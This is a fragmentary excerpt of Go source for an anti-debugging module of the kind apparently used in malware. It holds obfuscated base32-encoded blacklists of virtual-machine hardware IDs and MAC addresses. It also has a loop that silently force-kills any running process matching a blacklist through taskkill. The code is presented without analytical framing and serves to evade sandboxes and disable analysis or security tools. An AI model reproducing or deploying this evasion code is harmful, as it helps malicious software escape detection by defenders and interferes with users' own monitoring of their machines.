...
func NewAntiDebug() *AntiDebug {
	...
	blackListedHWIDS := []string{
		...
		"GM4ECQRTGM2DELJWGZBDALJXGE3TKLJQIIZDGLKGGM4TAQRTG4ZDQQRXHA======",
		...
		"GA4TGNCFGMZTMLJXGJCTILJUIU3ECLKCGNCTKLJTHAZUERBYIU4TGOCDGM======",
		"GEZEKRJTGM2DELJYG5ATELJTGJCEKLKBGM4TALJUIMZEIQJUIQ2TCMSFHE======",
		"GM4DQMJTGM2DELKEG5CDALKEIZBTQLKDGU3EMLJXIZBTSRCGIU2UGOJXGI======",
		"HBCECNRSGA2DELJYII2TSLKCGRCTGLKEGIZTELJTHBBDEOKBGEYDSNRUIE======",
		"GNATSRRTGM2DELKEGFDDELKEIYZTOLJWHBAUKLKDGEYEMNRQIJDEENBWGI======",
		"IY2TONBUGAYDALJTIM3TQLJRGFCUCLJYGAYDALJTINCUGRKGGQZUMRKGIU======",
		"IZATQQZSGA2DELJSGA2UILJRGNBDALKGINBDKLKDGVBUGNJVGU3TOQJTGU======",
		"IM3EEMZSGA2DELJUIVBTGLJWIZCEMLKDG4ZDKLJWIY3DGOJRGRCECN2DG4======",
		"IZBUKMRTGM2DELJZGFDDCLKFIFDEGLKCIE4TOLJVIFAUKNBVGA4UKMJXGM======",
		"INDDCQSFGAYEMLJUIFAUMLJUGU2UKLJYIRBUILKCGVBDAOKCGZBEMQJYIY======",
		"GA2TAQZTGM2DELKGIFCEILKBIVCEMLKFIYZDILKDGY2DKNCFGFATOM2DHE======",
		"GRCEGMZSGA2DELKFGYYDCLKGGMZDSLJSGFBTCLJQGNDDENZVGY2EMRBWIM======",
		"IRCUCRKCHBBUKLKBGU3TGLJZIY2DQLKCIQ2DALJWGJCUINSDGIZDGRRSGA======",
		"GA2TOOJQIMYDALJTIIZDCLJRGFCUCLJYGAYDALJTINCUGRKGGQ2DAMCEGA======",
		"GVCUERBSIU2DELJRIRBDQLJXHBATMLJQIVBTGLJQGMYUENRWGFCDKQZVG4======",
		"HFBTMRBRG42DELJQGQ3EILKCIM4TILKFIQYDSLKDGM3EMNZQINBTSQJZGE======",
		"HEYDOQJSIE3TSLJXGEYTMLJUINBDMLJZIZATKLKFGVATKOCDGQ2TQN2DIQ======",
		"IE4UGOBTGM2DELJUHAYDALJQGU3TQLJRIVCTQLKCIEZDMRBSIE3DOOCEGI======",
		"IQ3TGOBSGA2DELJQGBATALKBGZDDALJRIU2TCLKGIQYUEQSGGA3EGRBXGE======",
		"GFCDIRBTGM2DELKEGZBTILJXGEYEGLJZHBATGLJZINBTMNJXGEZDGNCEGU======",
		"INCTGNJSIU2DELJZGMZTSLJYGQ4DILJSHEZUCLKCIQ2TAQ2EIM3DGOKBGU======",
		"GYYEGOBTGM2DELJQIE4TOLJZGI4EILJXGMYTMLJVIYYTAOBQIE3TQRJXGI======",
		"GAZECRBZHA4TQLKGIEZTOLJRGFCUELKBIM2TKLJRIQYEGMCBGY3UKQJYIE======",
		"IRBEGQZTGUYTILKGIE2TOLJUG43UILJZIQYUMLJRINAUMNCDIM4TERBQIY======",
		"IZCUINRTGM2DELKFGBCDMLKDGY3DSLKEGUZUMLJSGUZUINRZGZCDONCEIE======",
		"GJCEIMKCGE3TMLKDGA2DGLJUHFATILJYGMYEMLKDGYZDGRSGII4DQRRTIM======",
		"GQ3TEOKBIVBDALKGIMYDOLJRGFCTGLJZGY3TGLKDIUZTSRJXHFBTQQJQGA======",
		"HA2EMRJTGM2DELJWIM3DOLJVIZBTMLJVGYZTSLJZIIZUGQJTIQ3TONKBGE======",
		"IRBEGMRSIU2DELJVHFDDOLJRGMZDSLKEHFDDELKFG44ECMSFIU2UERBQIQ======",
		"INCUMQZYGM3EGLJYINBDCLJUGVATMLKBIRCDOLJSGA4TAOBVIVCTEQJVG4======",
		"IE3TOMRRG42DELKCIUZDILJYIEYUGLKCHA2TSLKEG5DDQMRVGFATQM2EGM======",
		"GNDDGQZVHBCDCLKCGRDDELJUGAYTSLKCGJATELJSIE2TAMCFHE3ECRRSIU======",
		"IQZEIQZTGM2DELJTHE3EGLJWG4ZTOLKBHBDDMLJQIM3DMNZTIMYUIRJQHA======",
		"IVAUIRBRG42DELJUHAYDOLJQGBATALKGHEZEKLKDINCDSMZTIU4UIOCDGE======",
		"IFDDCQRSGA2DELJUII4TALJQGAYDALKBGRCTILJWGMZECMKDHBBTORKCGE======",
		"IZCTINJVIQYUCLKCIUZDOLJUIJATILJZGZBTQLJZGY3UCNSEGNATSNRWGE======",
		"HEZDCRJSGA2DELJXGBCDGLKGHFDDCLJYINBEILKCGM4TQQJSGFDDQOKDGY======",
	}
	...
	blackListedMacs := []string{
		...
		"GAYDUNJQHI2TMOTCGM5DANJ2MI2A====",
		"GFRTUOJZHI2TOORRMM5GCZB2MU2A====",
		"GA4DUMBQHIZDOORTME5DEOB2G4ZQ====",
		"GAYDUMJVHI2WIORQGA5DAMB2MMZQ====",
		"GAYDUNJQHI2TMOTBGA5DINJ2GAZQ====",
		"GEZDUODBHI2WGORSME5DMNJ2MQYQ====",
		"GAYDUMRVHI4TAORTGY5GMMB2GNRA====",
		"GAYDUMLCHIZDCORRGM5DEMJ2GI3A====",
		"GQZDUMBRHIYGCORYME5DAMB2GIZA====",
		"GAYDUMLCHIZDCORRGM5DGMR2GUYQ====",
		"ME3DUMRUHJQWCOTBMU5GKNR2GEZA====",
		"GA4DUMBQHIZDOORUGU5DCMZ2GEYA====",
	...
	for _, line := range lines {
		...
		for _, bl := range ad.blacklistedProcesses {
			if strings.Contains(lowerProc, strings.ToLower(bl)) {
				killCmd := exec.Command("taskkill", "/F", "/IM", procName)
				killCmd.Stdout = nil
				killCmd.Stderr = nil
				_ = killCmd.Run()
			}
